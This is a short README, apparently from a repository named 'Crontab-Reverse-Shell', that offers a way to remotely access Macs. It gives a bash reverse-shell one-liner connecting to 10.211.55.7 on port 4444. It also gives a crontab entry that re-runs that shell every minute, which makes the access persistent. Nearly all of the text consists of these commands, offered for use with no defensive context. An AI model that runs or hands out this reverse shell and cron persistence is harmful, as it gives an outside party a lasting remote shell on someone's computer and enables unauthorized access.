# Crontab-Reverse-Shell
To easily remote access macs.

Temporary:

bash

bash -i >& /dev/tcp/10.211.55.7/4444 0>&1

Permanent

bash

EDITOR=nano crontab -e

* * * * * bash -c 'bash -i >& /dev/tcp/10.211.55.7/4444 0>&1'

CTRL + O

Enter

CTRL + X

crontab -l
